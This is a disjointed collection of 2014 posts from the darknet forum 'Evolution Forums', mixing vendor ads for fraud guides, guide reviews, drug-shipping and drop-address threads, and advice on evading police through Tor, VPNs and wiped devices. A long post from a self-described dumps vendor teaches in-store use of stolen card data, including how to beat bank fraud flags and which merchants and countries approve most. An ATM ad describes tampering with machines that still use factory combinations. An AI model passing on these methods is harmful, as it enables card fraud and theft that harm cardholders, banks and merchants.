I do know that Tails checks to see if it is being run in a VM (for compatibility with the hypervisor).BTC addresses/transactions and IPs are not hard to link.Two tumblers aren't strictly needed, but if one of them is run by LE they will only have the incoming address or the outgoing address not both.Also not a bad idea to change HDs as popadoppalus mentioned but might not be strictly necessary. Same with the NICs. Very easy on almost all laptops.@popadoppalus - I think the idea of a 'burner laptop' is more to the tune of being burnable if needed, not as standard practice. Might be wrong in some cases tho. "

Disabling it from autostarting can achieve this. See a program called macchanger. Have it autorun, then manually enable wireless after each boot up. Got ya.

Like I state in my guide this method has not been saturated at least to my knowledge since I'm the one who came up with it, at least from what I know!  This guide includes:-How to sign up for the free service-How to get free temporary email accounts-How to refer new accounts to yourself so you gain more cash This guide is detailed and about 2 pages along, with all the information I use on my end, including different techniques I use myself that I think are better ways to do the program overall. If you have any questions please feel free to ask away, selling the first 10 copies for $30 and willing to allow a couple of users check out the document and vouch for it as long as they're reputable and ready to earn some money:) It takes a little time to set up, maybe a couple of days or so, but once you're all set up you will be extremely happy. Let's get rich friends:) Link to my posting: http://k5zq47j6wd3wdvjq.onion/listing/18614 !!

Too many tards like sonnyvalenti running around pming kids offering vouches just for receiving. I've checked out a couple things behind him and after seeing his post, laughed. I'm done playing world police though. If you want a REAL vouch that people will trust then message Yasuo.  Edit: Same goes for reviews... If you hand out copies to members not know for good reviews across the board, that don't know how to be fair and unbiased then don't expect massive sales after some random review. Now if you talk to many of the people who have Yasuo review their products you'll be able to verify they noticed a good increase in sales. People respect what he has to say because he doesn't ride dick for recieving guides, and methods, lol. He tells it like it is, also he doesnt speculate and just read something assuming its good, he puts it to the test. Now if your method/guide is garbage I could understand why you would avoid him, but all it says to people like me is ""pass on this""

From what I understand LE can use timestamps to pinpoint your IP if you browse clearnet while you're on TOR. I don't know the specifics but don't go on clearnet while you're using TOR and try to put some time between regular browsing and TOR usage to obfuscate your IP activity.

"Evolution Forums","CanonballJoe","8301","2014-04-25T10:34:38","Re: StrattonOakmont Cashout Package 2.0 - AVAILABLE NOW","Guides Vendors","OK, so I bought a copy (at a reduced price of $200 as I was quick off the mark).  I bough this on the very first day, and have been wrestling with what to write ever since. Badger3 got it kind of right. If you are a noobie and want to know how to even go about taking Paypal for the run around, then this is a great guide. OP said he has been using the methods for the past month or so, and all of it was written from his own experiences etc, which I do agree with, I am sure he had been using thee methods for the past month... The only thing is, so has everyone else who knows what they are doing. If you have no idea how to set-up decent stealth/hacked accounts, and don't know how to clean your paypal money, then this guide will tell you how to do so, in very eloquent English (clear and concise with reasonings). The part of the guide where I believe he is basing this price, is his PP -> BTC Method. This is a good method and will work, but it is already well known by any veteran. That said, if you don't know of the method, then it is really useful and probably worth at least $100 alone. At first, I immediately messaged OP as there was nothing 'NEW' in this method at all. Everything you can  learn here is easily found via other guides (the majority of the stuff in here is frauding 101 available from any of the basic compilations guides on Evo offered for around $5-$20, which I feel was used as a 'padder' in this guide to make it seem longer/more in depth. Having said that, if you don't know any of this, then it is absolutely necessary! If I were to put a price on it, I would say $400 is quite steep. If you are a Veteran then obviously you will probably learn nothing new, but if you are new and want to get into carding, then this is one of the best guides for you to provide a decent income, but I would prefer if the guide was $100, $150 at a push.  This is my honest opinion about the guide, if I were to review the Vendor specifically, I would rate him 10/10... When I complained he tried remedying the situation, and even sent me what could have been a great little bonus to smooth me over (but I already knew the method). He was very polite, respectful and it's clear he wants to be a top seller on EVO, so Kudos to him! If he was an ass then I wouldn't have finalized, but he seemed very genuine, and buying guides is a gamble anyway!!! Bulletpoints: +Noob Friendly+Easy to read and understand+Includes all key points of other guides for the whole process of PP fraud+Provides links to all materials/suppliers needed+Basically setup and go, you can earn back the cost of the guide in a few days if you're new to this+Great vendor, good conversation; genuinely wants to please his customers. -Overpriced IMO-Not useful for veterans (unless you don't know a 2 step PP->BTC method)-Not a NEW method, just a good compilation of known methods, with handy tips.",""

"Evolution Forums","StrattonOakmont","8301","2014-04-29T11:36:37","Re: StrattonOakmont Cashout Package 2.0 - AVAILABLE NOW","Guides Vendors","Thanks for the honest feedback I appreciate that you wrote a fair review even though we didn't agree on all points. My response here is more for future buyers as I already wrote most of this to CanonballJoe via PM.  Here is my reasoning behind this guide and its price. In my opinion it is not as easy as mentioned before to get all of these resources together and it took me personally months to compile this in depth collection of knowledge about Paypal.  You can always try to save money by spending a lot of time trying to find ressources yourself and then pierce it all together to a full picture of what you have to do but this is firstly time consuming and secondly not as cheap as you might think. Now first of all I have seen no guides between 5-20$ that cover the topics from my guide such as the creation of stealth accounts (especially two different ways) and ways to load and cashout paypal. The guides sold for that kind of price are probably the ones that I included in my guide for free. But lets assume that you could get all the information except for the ""StrattonOakmontâs PP to BTC Method 2.0"" for around 250-300$ which is already a low estimation because you are probably going to buy a lot of useless guides as well while trying to pierce all the things together. What did it help you then? You are still missing a very valuable part of the guide, you probably spend days if not weeks (due to delay in the delivery of all the guides) trying to get everything together and in the end you still don't have a clear and concise overview of what to do.  The only case in which this guide might be ""overpriced"", or simply just not the right thing for you, is if you already have a lot of experience with Paypal and are already able to do all the things contained in the six chapters of my guide. If that is the case please do not purchase you will probably be disappointed. For everyone else I think this is the best guide on the market for Paypal at the moment and the price is very fair considering that this will enable you to make much more back than you payed for the guide in a short amount of time and that most of the information contained has a far less risk of saturation than most other short-lived guides. Let me know if anyone has any questions and a great day to you all",""

You think not talking about stealth slows the feds down? Let's say I'm a postal inspector investigating the methods that darknet vendors use to ship via USPS. How would I learn about this? Personally, I'd buy about 10 bitcoins, log on to Evo, and make modest purchases from about 20 different vendors. Once the packages were delivered, I would then have 20 data points on techniques used. I'd also find that they'are all basically the same. What did this cost me? 2,500 bucks and an hour. You think this slowed me down? Guess again, son. Also, my budget is much bigger than $2,500 bucks. I could order from every vendor on the darknet, and by the same technology that protects us, no one could ever know. Besides, you mostly desribed what ever vendor does, so why are you bitching? Other than ""x-ray proofing."" You got lead-lined bags nobody knows about? If you get it vacuum sealed in mylar, in an envelope, that's average. If you get it vaccum sealed in, in mylar, in a DVD case, that's pretty cool. Won't stop the feds, but at least if gets mis-delivered to my neighbor, they'll probably give it to me before they realize what they were holding. If you order weed, I guess people do some additional stuff due to the smell. I don't order that, so don't know first-hand.","FrostyBong wrote:We should not discuss details of packaging.

I would also avoid like the plague any of the clearnet providers, e.g. Gmail.com, Yahoo.com, etc.  Even Lelantos.org would fall on that list.  The reason for saying that is that any provider they can reach, i.e. that has an office, staff, etc. can be served legal paper and forced to roll-over on you.  Dot onion based services such as Sigaint and mail2tor are preferred in that regard.  Naturally, all outgoing email should be PGP-encrypted; for incoming email, customers should be instructed to use PGP, or emails will be deleted on receipt. They should also be instructed to use nondescript subject lines.  Fantino","jamesbong007 wrote:which anon email provider is best then?"

The replacement Tormail is run out of India, and the operator has been described as 'sketchy' -- allegations have been made that they monitor the contents of email.  Safe-Mail should be avoided like the plague.  For starters, the company was featured in Forbes magazine just over a year ago as the ""go to email provider for the Darknet"".  In any other circumstances, the owners/admins of Safe-Mail would have been thrilled to death to be featured in Forbes -- Forbes is read by just about every suit in existence (including the suits at the FBI). If they weren't aware of illegal activity before this, they sure as hell learned about it after Forbes pointed it out to them.

I have decided to put up this guide to highlight some flaws I have seen in this new TOR based group of communities/market places. First rule in busting any crime for law enforcement is âfollow the moneyâ. All crimes are for profit and law enforcement are always going to follow the money trail and see where it leads. Believe it or not bit coin is actually the easiest currency to trace. They can see which wallet is paying which and trace back to the originating wallet. You think you can launder your cash? Think again, egold tried it and they went after their servers, they got warrants to get registered email addresses and IP addresses. Generating a new wallet each time isnât really helpful because what they are trying to prove is that your online persona is you. So all they need to do is to successfully trace one transaction and thatâs the one they do with you. The law enforcement we are facing here is the US SECRET SERVICE. Their jurisdiction is the USA and to completely avoid getting busted DO NOT DEAL WITH USA. I know it is difficult but the truth is for them to build a case against you or come to your hoe country they will need you to ship something to the USA or commit a crime involving USA. By all means sell your drugs just donât sell to USA  and you will be fine. Always remember that they need to build a case before a judge who doesnât know shit about you or the scene. So they need to gather enough evidence to show that you are the online criminal. This brings me to the ways I believe they are currently building their cases: PGP is meant to be an encryption method, however to get your public and private keys you need an email address, not only do you need this address but you need to upload the keys to a server (not too sure about the upload). All the US government needs is to get a subpoena on the upload servers and they have all our private and public keys. Now to prove that you are you all they need is to find the private keys on your computer or you. All vendors are currently required to give public keys, this to me gives the US government evidence to prove who vendors are. You think using PGP stops them from reading your messages? Think again. Evo sells drugs and takes escrow so odds are the owner of this site isnât LE. However my advice to all vendors is DO NOT DEAL WITH USA. If your gut tells you someone is a cop do not deal. Prison is full of people who ignored their gut feelings. Try as much as possible to separate your personal life from your work life. Never store credit card information on your computer, US government will use GREP to fish out credit card numbers from your hard drive (http://en.wikipedia.org/wiki/Grep) .  Chat messages do not count as evidence in court so theyâre actually safer than mail or pm. The myth that you need to have on ID to do business is false. Having one ID only helps LE identify you easily in court. Change your ID regularly, it may be a pain but believe me it will help you in future.  I donât know much about TOR but I believe that for the US government to allow it to exist they must have a backdoor. Iâm getting a bit tired of typing now but I will keep dropping knowledge from time to time  P.S it's nice to see that the scene is still alive and well",""

You don't even have to put a ""fake"" email, you can leave it... blank! You claim all this being around stuff and you don't know that?  IP addresses have been ruled as not equal to a person in the US courts, meaning all they can do is get probable cause to take your shit, and if you're secured+encrypted not caving into pressure, they will have nothing. PGP does prevent people from reading messages, including law enforcement, unless they gain access to the private key through guessable passwords or threatening someone into giving it up. If you encrypt a message to a person, you can not decrypt it unless you also included yourself for a recipient, this means a vendor's private key is useless to decrypt any messages sent to a buyer. What is curious you don't mention is possession of a private key, which is more damning for evidence then any of this silly babble. You can't explain away possession of private key.

Different dumps work in different in DIFFERENT AREAS.      LESSON 1  to start this topic        FRESHNESSS FRESHNESS FRESHNESS Before you want to start any kind of carding in store, you will need FRESH bases.   This is tough (trust me...i am friends with many hackers and i assure you that there is a handful in the world that do it as a job).   When a vendor gets update, there is ton's of tricks you can use to actually know how fresh the base is but thats for more advanced carders.  Once you have your fresh base... you need to atttack it QUICK... QUCIK QUICK QUick.    Now i have been selling for few years (yes i am reseller because no matter who says they are hacker.. i assure you that they are not.... does it make sense that a hacker hacks 260k of dumps and then he breaks it down ? risking dealing with tons of customers.. risking his base dying and only getting through few thousand dumps.  NO its not... He hacks 260k pieces (normal base) and then has few trusted resellers.... then they have resellers... then most of the general carding world gets it. YUP im sorry to spoil it but thats how it works.  ok back to main topic.         When base comes you need to work it asap... i have had bases that die by 6pm the first day and they are extremely fresh... so everything is approving $1k swipes then it just all STOPs and starts to flag..  When i sell dumps on here... i will wait to know your needs but i will never ever just send you right away because you need to know that bases flag and my selling you pieces is just a waste of all of our times.    When update comes.. then i send... I will never ever ever ever sell a base for more than 4 days max (most canadian cities will die then... usa and parts of CARIBBEAN will stll be ok but for CANADA customers.. your pretty much fucked because if you know carding.. you know its over at this point. ) Canadian banks is extrememly smart because there is only a handful of them in canada ... i think major 6-7 banks so you can bet they know their stuff and they know very very quick. Canada carding is different topif of its own  (base flags quick... certain bins work wonders in different stores.... Montreal --Toronto-- Most flagged cities problably in the world)  so the moral is ... MAKE SURE YOU are ready to go when a base comes especially if you are from CANADA.  Bahamas jamaica dominican any resort in the world (yup... everything approves at a hotel.. the security algo is just meant for everything to go through)  EX--- BAHAMAS ATLANTIS ------ they have many stores inside this hotel... and i assure you.. most flag base and bins will work inside this hotel (gucci... rolex...hublot..verscae..etc etc) then take the same bins from same base and just TRY TO swipe them for even $400 downtown bahamas on main strip ... lol what happened ? YUP.. nothing working .. take same dump back to atlantis at versace.. and ?? ? ? ? ? YUP just approved 2k   DIFFERENT POS have different APPROVAL methods and fraud calculations...   CHECKER: NEVER EVER EVER NEVER EVER NEVER use a checker on your dumps... anyone that is an expert on dumps KNOW'S this.. i assure you that its n00bs that check... WHY? ok so lets check this out.. u just checked a dump and it approved for $5 (most checkers check non sense amounts )  Why 75% u kill or flagged your dump..   ` the checker is good for a few DAYS... yes i said days... eventually that merchant will get a HIGH fraud algo and banks know you do this .. .so what they do ? they WAIT for a check and then they FLAG the base.. or better yet KILL the card.      next trans will be HOLD CARD ---- CALL TO AUTH-- some low fraud areas are ok but man... if there is one lesson here to take from a CHECKER... its not to use UNLESS it might be the FIRST dealing with a guy that messaged you on icq saying they have dumps for sale (these are spammers ready to take your money and send you non sense .. yup i assure you this.. so dont think you wont the LOTTERY and send money... JAMAICAN LOTTERY SCAM lol same shit.. different pile   SO please dont use checkers guys or GALS .. just not the right thing to do.. i assure you that.    FLAG BASE So... bank knows there might be potential hack on a terminal.. BUT there was 1.2 million cards in that base... so do they call every personl.. explain what happened... resend a new card ?  NOPE thats too expensive... so what they do is FLAG the base.. this will limit the card to work out of the BILLING ADDRESS or the approvals will be much lower to control the loss.   LEVELS of blocks--- DUmps approving for $2k a dump .. everything is going great .. then ... BLOCK.. nothing is approving... This does not mean your base is dead.. just means flagged... ever have a dump that approves all the time for $50 but wont work nothing above that ? yes.. thats a BLOCKED base.. and this happens always.  Now $50 is very very very very low but its the final FLAG before it starts to say HOLD CARD (last step for bank would be to let you know they fuced up.. someone got your info. and pay to send you a new card)  POS BLOCKS Electronic stores have pretty bad pos blocks... Because carders keep buying ipads and the cc companies know this is a high fraud area... so it will be more tough for a approval.  j. Another thing is pos blocks.. I will give example of this... CLOTHING stores have a good pos algo .. Lets take Walmart .. try $500 with a dump and it declines... then you go to HOLT RENFREW downtown montreal and it will approve .. Bad example because the walmart try will probably flag you dump and its now FINISHED unless its very low.. bank software hard at work ..  AMEX GREAT for restaurants --- Clothing stores-- Hotels..Concerts--People do not understand why amex is so cheap ( i can get a list of 100 pieces for $7-10 each) ... I assure you .. they are great but will work for your FOOD ... shopping is OK .. hotels is amazing... Inside sporting evens or concerts buying BEER is fine... LAS VEGAS is great.. will work in all resorts at lounges ... restaurants.. etc.. bottle service.. If this is your objective.. when i start posting dumps and we become known with each other.. i can sell you amex that will approve 100% for $2000 purchase MIN.. I had customer buy 3 amex and do 14000 in las vegas in 3 days.  YES TRUE STORY... everything approves in vegas also..  GENERAL RULE is EUROPE IS TOUGH (lots of guys doing manual input trick... very easy.. cvv2 .. but working like  a dump.. will explain more if needed later)... CANADA is ok but TOUGH algoUSA IS EASY---- yes i said it.. and anyone thats expert carder will tell you this... USA IS the easiest place in the world to card .. if you dont believe me.. ask a expert carder that worked in the usa before.  If he is from europe south america or canada.. he will tell you how much he LOVESSSSSSSSSSSSSSSSSS USA.    GAS STATIONS... i know the most simple way to start carding is gas stations.. the algo at the PUMP is much tougher than inside the store... In general gas stations have tougher approvals but if you have fresh base.. you shouldnt have any issues with this.  Again.. pump will work but its tougher... especially canada carders... Petro canada.. Shell gas stations... is the easiest approval but you must go inside if you want your hit rate to work better..   SO ... i hope this was a good little introduction.. there is MUCH MUCH MUCH MUCH more to know .. many say instore carding dead but i assure you there is guys doing 100k of merchandise in a day out there...  Its not easy but it does exists...Like any job.. you have to prepare to be the best .. which starts with research.. trail and error and execution  One thing you should of taken to this introduction is  FRESHNESS is most important. ` DO NOT WAIT to use the dump 3-4 days later.. you need to program and you need to start ASAP because i promise you THIS.. that hack had 200k dumps in it and people around the world that bought are using it when you thinking about where to go and getting people... Have evrything ready and start carding right when it comes to assure best results.  FLAGGED basesWill always happen even with fresh hacks (yup... banks have pretty serious software) but it does not mean you will lose.. One experience i will give is 2 different carders... one always do $500 amount.. had 50 dumps.. tried all for $500 and all decline.. (pretty flag base)  2nd carder Had 20 pieces  .. after first 3 decline.. He brough amountt down to $250 (this is usually a EU DUMP flag amount)  still 2 dumps decline.  Then he bring down to $200.. every dump did $1k each ($200x5)  so in total he had 15 dumps left after 5 bad and he did 15k of product.   SAME BASE ---- SAME BINS --- SAME CITY--- SAME TIME THEY START-- different results (this is a carder that is more experience.. very smart guy ... good customer of mine for many year)   POS security differnt pos have different approval algo... older machines always best as newer is smarter usaully but still depends on store. Ex.. WALMART pos -- HOME DEPOT pos.. TARGET pos... they are much smarter than say a pos at THE BAY (canada) Macy's (usa) Hotel ( any country)   BARS--RESTAURANTS--ENTERTAINMENT VENUS--NIGHT CLUBSAMEX is the best place for these.. dumps that decline $25 gas... will approve $1k ace of spades bottle.  i know this is weird but  i assure you this.    I VERY MUCH hope this introduction was good for you.. and YES i am dumps vendor but please do understand that i want you to have best results.   Because its in my best interest for you to make money and buy more from me.  Together we get to make more money DUMPS vendor and Carding expert that love to share with others techniques. PLEASE LIST  what maybe i can help with.. PM's are welcome..Thank you .",""

(i wouldnt need to tell the local mailman anything)  2)to have the mail in some random name, and being that things are very small and perosnal here, i could tell the person who works in the local mailhouse, that i have a guest, and if they recieve mail in so and so's name, to put in my box. (i would need to tell the local mailman to expect mail for so and so)  3)not to tell them anything, and to put someone elses name on the package, but with a prepaid cell phone number on it (very cheap, and annonymus). the procedure here is, if they get mail with an unrecognized name, if theres a phone number on it, the local mail person, calls the number to find out who it belongs to, and then puts it in their box.  so in a case like that, if i answer the phoen and say, its a guest whos not currently here, but put it in my box, that could leave me compeltely out of the picture..  my questions are as follows:1)which one sounds like the best option. or is it not worthit taking risks when theres no drop location?",""

The method:Iâve personally used this method  for a while, but didn't make this guide before extensive testing and deciding which would be best, sell the guide or offer the service on Evo myself. The guide is very straight forward and noob friendly, if you're comfortable with those Paypal transfers you will look at this as a gold mine. Only 10 copies will be sold for now( plus 1 copy for a review). It's been available for months and I personally would like it to keep that way. REVIEWS:

There is a success rate since you are scamming people, they have to believe you.If you've done like 3-4 runs and you say you have made less than $10k I wont believe you. The reason I wont believe you is because >$10k is possible in one attempt.

ATM hack guides (4 different manufacturers)  **********http://k5zq47j6wd3wdvjq.onion/listing/17085********** his listing includes ATM hack guides for the following four manufacturers: Tranax, Triton, Hantle, Hyosung. I only sell 20 of these to not alarm the manufacturers so get them while you can! It includes step by step guides and manuals, with the help of these everyone can hack an ATM. Gain access to the ATM's in seconds. This is a very simple process. These Atm`s can be found all over the world in Arcades/Malls, General Stores, Bars/Pubs, Gas/Petrol Stations, Corner Shops ect ect. WORKS WORLDWIDE just need to find the right ATM. Can work with about 10% of the ATMs which don't have the factory preset combination changed. One guy found 10 of these a day! This guide teaches you how to change the denomination of the bills inside the machine. In easy word the machine will think a 50 note (or 20 depending on the machine and the currency) is a 10 note. This means you withdraw 10 and get 50 instead. Withdraw 100 get 500 instead. Its that easy! It is recommended to use anon bank cards for this and not your own card even though that might be risk free with low amounts but I wouldn't recommend to try. **********http://k5zq47j6wd3wdvjq.onion/listing/17085**********

"Evolution Forums","walkers","12703","2014-06-08T10:36:19","Open Cashplus buisness accounts + guide to receive them. Ideal cashout","Guides Vendors","Hello all, I've created a guide on how to create Cashplus business accounts, plus how to acquire drops for you to receive the cards themselves. These are a fantastic alternative if not outright replacement for iban cards, as they are not known to Paypal for fraud, and you can verify your accounts with both the bank account, and prepaid that comes with it. Not to mention you can withdraw Â£500 a day and hold a max of Â£15k in one account, so obviously the potential for these accounts is enormous and the work required to put in is almost non-existent.  No SE'ing is required for the drops, and there is only incremental investments for a potential massive profit. Also, just for an introductory offer, 5 of these guides will go for Â£100, after that I will only sell 5 more for Â£150 and then increasing the price by Â£50 after 5 have sold each time. So if you're interested in these accounts and based in the UK, jump on it for a bargain. I'll await your queries. Listing: http://k5zq47j6wd3wdvjq.onion/listing/21345

You are right, you never know if your vpn provider logs or not. The thing is that yout ISP surely does. Therefore, since you don't want to let your isp know you are using tor, (but you might not care about this, if you connect for example from a public wifi), you should encrypt all your connections on your host OS with a vpn (hopefully a very good one, read below), and then connect to the tor network, so it sees only your vpn's ip and not yours. This is probably the best setup. Please note that the vpn on the OS and on the VM should be from different providers. About which provider logs or not, it's not for us to know. As you may know even if they claim not to keep logs, they probably do. Services like mullvad, private internet access and so on which people think are very trustworthy, probably keep logs. That's because even though those vpn providers are not forced to keep logs in the country they are based in, they have to rely on other isps' infrastructures to make you access servers in other countries; and well, those isps do keep logs, so the whole thing about the super-tight no log policy becomes suddenly useless. A powerful adversary such as the nsa or another government agency could easily get the access if they wanted to. So the one thing you could do to tight your security is to rely on a vpn based neither in USA nor EU, but instead in a country with no data retention laws at all.. there are few of those..","Ziiot wrote:Thanks for the respond, but why should i have vpn on host? and not with tor?

I'm pretty much a keen novice when it comes to the deep web and all the extra security measures that come with it.  Like a lot of other people here, I just want to be able to purchase some products from the marketplace and receive them knowing that me and my computer are safe to do so. My very basic understanding, based on reading forums and articles is that: - I need to prevent my ISP from seeing that I am using TOR (the reason for a VPN?)- I need to prevent sites that I visit from seeing my IP address and also from seeing that I am accessing it via TOR (the reason for using a proxy/socks?) I checked my TOR browser settings and it showed tha socks5 was already being used. I understand the basic concept of Tails but to me it sort of seems similar to using TOR via a VPN  And I had a quick look at VM's, not exactly sure how it would benefit me in what I want to do. As you can see I have an extremely limited understanding of this. Could somebody please give me a bit more of a run down on all of this??  I don't necessarily expect a complete lesson or tutorial (although that would be very welcome), i'm just after a fairly clear idea of how all these things play a role and if there's anything else I need to look into .. Or even a link to an article or two that explains it.. Thanks a lot.. Anything will be helpful!!

Here is mine setup, just for your reference: VMs such as Tails and Whonix is encrypted and stored on a flash drive. Every time I finish using the session, all VMware logs get wiped. The flash drive contain a portable versions of VMware and VirtualBox, Bleachbit and VPN files. My host machine contains no info on what I do on darknet or illegal activity and I can change host machine anytime. USB drive is expendable and easily destroyed. Before launching the VM, VPN is launched first and I always rotate VPN uses (OpenVPN,PPTP). Then of course the VM launched will have TOR running. After every use of the VM I would wipe the logs in it. Power off. Then wipe the host machine's logs. I carry the flash drive with me everywhere I go. Layers of security is the best kind of security.","Ziiot wrote:Hey everyone.Is this a good setup?Thanks "

In order to connect to anything (tor, vpn, etc) you have to go thru the ISP first. ISP->VPN->Tor allows the ISP to only see an encrypted VPN connection (hiding content from ISP), which hides usage of Tor from the ISP. The other way is ISP->Tor->VPN, which doesn't hide Tor use from ISP (does still hide content), but hides your real IP from the VPN. I agree with maltivera that this is ultimately safest, especially when combined with public wifi, etc. though at the end of the day the specific use case is really the deciding factor.","BlueHighSky wrote:In that case go you -> tor -> vpn -> isp That will hide usage of tor from your isp and it will hide your ip from your vpn.

"Evolution Forums","usermyname","37501","2014-12-22T10:55:33","Re: Setup VM ->TOR -> VPN -> Socks5?","Security & Anonymity","So, what I take away from all this, is that simply running Tails from a live USB drive wont give me protection against ISP nor hide my browser from the landing page? My ISP would still see me as a TOR user and the landing page would still see my IP as a known TOR exit node? It would only protect me against LE once they came to search for any speccific trace or proof of ""activities"" within my host machine, since all trace of said activities would have been wiped from the RAM memory after shut-down or reboot. (?) Would it still by default (w.o. changing any settings) hide my specciffic traffic from the ISP via encription? How exactly would I combine TOR and VPN so that both the ISP and landing page wouldn't recognize me as a TOR user + my ISP wouldn't be able to see what I'm browsing? + how smart is LE when the USB would be a certain type with an error that wouldn't allow to boot Tails unless you knew exactly how to change the boot parameters, would they figure it out? I mean, without changing the boot parameters, Tails seems to be loading forever but never actually boots up.  Help greatly apreciated!

I spent about $10 on apps and didn't get a refund on a single purchase. Why? Most apps are not eligible for refunds. Some are but I think most aren't and I don't know if there's a way to find out which apps are eligible. TheKushSaiyan ""accidentally"" forgot to mention that in this listing's description. You pay $5 for an app then cross your fingers that it's eligible for a refund and if it's not you're fucked. You bought it and you're not getting your money back. ""100% Working"" he said. Bullshit. It's an outdated e-book and I'm sure Google Play already knows about this scam. Maybe it used to work but it's doesn't work anymore. I'm not a vendor and as far as I know TheKushSaiyan is the only one selling this e-book so I'm not talking shit about him so you'd buy my method instead.  So I messaged this guy and asked for a refund and he refused saying, word for word: ""i know this works i just got refunded $120 this morning? i can't offer a refund i can offer you a free ebook in the future both methods work"" Fuck that, I asked for my money back and for the money I spent on the apps I paid for. He basically told me to fuck off. Don't buy this shit; it doesn't work. I noticed he dropped the price on the e-book a little while ago too. I wonder why.

This is bad for fraud-related activities such as carding websites because they can see that your IP is flagged, meaning they'll most likely decline any order you're trying to make as the IP you're connecting from has been linked to nefarious activity in the past. As far as your connection goes, you're still fully connected to the internet and Tor, and it won't affect your ability to access the marketplace at all (because Evo doesn't care what IP you're conntecting with), and doesn't mean you've got a security flaw.

Don't worry, they will not tell you this, you think all is ok and continue with your shit and bam. Go read news. Keywords: anonymous, lulzsec, crappy shit of hidemyass IVPN ... It's very easy: VPN == privacy, Tor == anonymity. Combine both and you have what you want. If you are in the US, use a VPN in Russia.

Using Tor alone, well, the ISP knows you're using TOR even if they're not sure for what, they've still got the metadata on your TOR session. That's enough to form a picture of your TOR use and possibly match it up with carding sessions, at least on the NSA level although how involved they get in low level shit like this (for them at least) is unknown. You also don't know whether an exit node you're using has been compromised by being run by LE or whatever. Additional layers provide added security and peace of mind by making tracking you all the more impractical.","ExaltedKnight wrote:Why not just use Tor instead of a VPN?"

I do. I think they are getting many from 'free samples' or vendors they've busted. Once they have sufficient info, they will raid. Local LE has time and would LOVE to go through your computers. So, keep your shit clean. I made a mistake when I first started on Evo, ordering from a fairly new vendor (50+ reviews, prob mostly fake).. it was obvious scam, but my addiction got ahold of me. Turns out they were shipping fake stuff. Now I am being asked for drugs locally by people I don't know?!!? HMMM... OPSEC isn't only for vendors. NOTE that I do not think Evo itself is a honeypot or anything, but you have to ASSUME that their servers could get compromised one day and every bit of unencrypted data is in the hands of LE. Also assume the same with vendors. Use vendors that you know have good opsec, not the best deal. Bad news is you learn how to not get caught about the time they send you to prison ... kind of like life, learn how it works by the time you're retired. LE said in interviews they intended to go after buyers next. I think they will. Just a few, to make an example and disrupt the markets. Don't be a soft target.

VPN is more used for data encryption than anything else, as most VPN providers use AES-256 which is the industry standard for encryption and has proved it's right to be chosen as an encryption standard. But then you have to realize that pretty much every proxy and VPN provider WILL hold activity logs on their server which will include in your inbound IP address (your actual IP address) along with the date, time and any other relevant information which then can be passed on or 'intercepted' by government agencies.  Internet security is about being to control pretty much every aspect of what your computer can do, what comes in, what goes out. And in theory, all it takes is education to learn how to keep yourself safe on the internet which is why I suggest you have a look around on the internet and learn about the basics for internet security, if you are looking to convert to Linux (presuming you are on Windows) then you'll want to make sure all your hardware is compatible with Linux and you want to know how to use Linux before you have it installed otherwise you'll just be sat there scratching your head. You want to go round quizzing each VPN provider, search around and read reviews as you'll find the majority of them proclaim to be against new legislation to spy on people but really wouldn't stand up to a policeman knocking on their door without soiling their underwear. It's just simple practices that make you more secure.",""

STUXNET was one of the most memorable hacks in recent history. but it ran against XP boxes on air-gapped network. someone unknowingly released it and it was detected and identified by Kaspersky. Snowden's files had a PP presentation on NSA custom USB stick codenamed Cottonmouth, but that is a hardware adaptation and you are not likely to ever encounter one. 1 TB sticks are now available commercially and i have heard rumors that NSA has 3 TB stick. you definitely need USB 3.0 (10 x faster). i had to custom build a box to get USB 3.0 without Win8 (i needed it for other reasons as well).",""

Clearing history in a browser still leaves for forensic tools to find stuff. Unless you secure-wipe the thing clean, it's recoverable. Tracking cookies can be blocked as 3rd party cookies, but regular cookies can still be an issue, as to identification. By public IP, you mean such as an internet cafe? You can still be tracked, and networks keep logs [though VPN should remedy it, assuming no records kept] However, VPN shouldn't be tracked, if you're at 2 different locations. Account identification, device identification, those are some worries, but you should be fine, between locations.  As for poppadopalus's comment on PGP, I have to agree, though I know I will get backlash for saying this. Never really bothered to use pgp, unless someone requests it. It has its benefits, but it's often much-overrated.

The guide does what moka say it would; provide semi-clean funds, which, if you have an IBAN or Anon. Debit card, can be used to exchange for Bitcoins or paper cash. However, I must add that the steps are quite arduous, and moka does not kid when he says ""$100 - $200 a day"". Despite this, to those who are relatively new, want extra cash or are innovative enough to create a larger revenue, this is for you. All in all, $50 is worth the money for this easy to follow guide.

I find that no vendors provide postal tracking info automatically, and few will provide even if asked, unless invoved in a dispute. Obviously, this is the complete oppose of non-darknet shopping, where it is always provided by default. The reason I always see cited is ""security."" My question is this: are there real, provable security benefits to this? Not interested in paranoid, ""I heard from a guy"" responses. Walk me through it. If tracking numbers were sent to the buyer PGP encryped, no one but the vendor and buyer would have any knowledge that a particular tracking number is involved in said transaction. Ultimately, when the package arrives, the buyer will have all information, such as return address, that could be gained via the tracking number. Personally, I think many vendors use this to get a few extra days between when a order is marked shipped on the site, and when it is actually dropped in a box. It seems like bad customer service with for no real reason. **edit**Oh, also, only really interested in the context of US to US transactions. Think Priority Mail.

I always provide tracking whenever the buyer ask for it.  I have checked so many packages through TOR before they were delivered and I have never had one single package get seized.  USPS has only lost 1 order in over 500+ I have sent out through here and Agora over the last year; all priority mail. That said, I also always check the tracking through a 3rd party site and not directly on USPS.com As a vendor, I love giving tracking because it helps build trust with buyers in a place where no other vendor seems to want to do it.  Most I think don't do it because they ""heard something"" or just assume it's the normal thing to do and don't know why.",""

I don't know if any of you heard of this, but it's basically a sidechain of Bitcoin (so everywhere BTC is accepted, DRK can easily be accepted) The reason i suggest to accept this currency on dark markets is because of the hacks from many bitcoin mixers. For every mix you want to do, you have to send your coins to a central entity, wait several hours, and receive them back. (IF you receive them back) There are many scammers out there, and even if some of those people giving that service aren't scammers, it's better to be safe than sorry imo. DRK has the in-wallet feature of mixing.  Basically you open your wallet, click on 'mix' and the masternodes of the network make sure your coins are mixed for a maximum of 8 rounds with other wallets. This provides more anonimity and is not trust based, which is a huuuuge plus. I'm just wondering what your concerns are regarding to this coin which would be a good reason not to implement it. 2 of the smaller darkmarkets have already started accepting it, which must mean something",""

